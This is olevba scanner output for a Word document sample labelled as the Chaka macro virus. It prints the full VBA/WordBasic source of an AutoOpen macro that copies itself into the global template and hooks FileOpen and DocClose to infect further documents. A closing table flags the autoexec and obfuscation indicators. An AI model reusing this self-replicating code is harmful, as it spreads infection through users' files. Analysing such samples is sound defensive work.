olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Intended.Chaka.c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Intended.Chaka.c - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO aUTOoPEN.bas 
in file: ./Virus.MSWord.Intended.Chaka.c - OLE stream: 'Macros/VBA/aUTOoPEN'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim a$
Dim M1$
Dim M2$
Dim i
Dim IV

Rem ChAkA! Nightmare Joker [SLAM]

On Error GoTo -1: On Error GoTo Finish
a$ = WordBasic.[AppInfo$](16)
a$ = WordBasic.[Left$](a$, 7)
If a$ = "Deutsch" Then
    M1$ = "DateiÖffnen"
    M2$ = "DokumentSchließen"
ElseIf a$ = "English" Then
    M1$ = "FileOpen"
    M2$ = "DocClose"
End If
If WordBasic.CountMacros(0) > 0 Then
For i = 1 To WordBasic.CountMacros(0)
    If WordBasic.[MacroName$](i, 0) = "ChAkA" Then
            IV = 1
    End If
Next i
End If
If IV = 0 Then
WordBasic.MacroCopy WordBasic.[FileName$]() + ":aUTOoPEN", "Global:ChAkA"
WordBasic.ScreenUpdating
WordBasic.ToolsMacro Name:=M1$, Show:=1, Edit:=1
WordBasic.StartOfDocument
WordBasic.LineDown 1
WordBasic.CharRight 10
WordBasic.Insert Chr(32)
WordBasic.StartOfDocument
WordBasic.LineDown 4
WordBasic.EndOfLine
WordBasic.InsertPara
WordBasic.Insert "ChAkA.InfectDoc"
WordBasic.DocClose 1
WordBasic.ToolsMacro Name:=M2$, Show:=1, Edit:=1
WordBasic.StartOfDocument
WordBasic.EndOfLine
WordBasic.InsertPara
WordBasic.Insert "ChAkA.InfectDoc"
WordBasic.DocClose 1
WordBasic.FileSaveAll 1, 0
WordBasic.ScreenUpdating
End If
Finish:
End Sub

Private Sub InfectDoc()
Dim i
Dim ID
On Error GoTo -1: On Error GoTo Venito
If WordBasic.CountMacros(1) > 0 Then
For i = 1 To WordBasic.CountMacros(1)
    If WordBasic.[MacroName$](i, 1) = "aUTOoPEN" Then
            ID = 1
    End If
Next i
End If
If ID = 0 Then
WordBasic.FileSaveAs Format:=1
WordBasic.MacroCopy "Global:ChAkA", WordBasic.[FileName$]() + ":aUTOoPEN"
WordBasic.FileSaveAll 1, 1
End If
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |aUTOoPEN            |Runs when the Word document is opened        |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

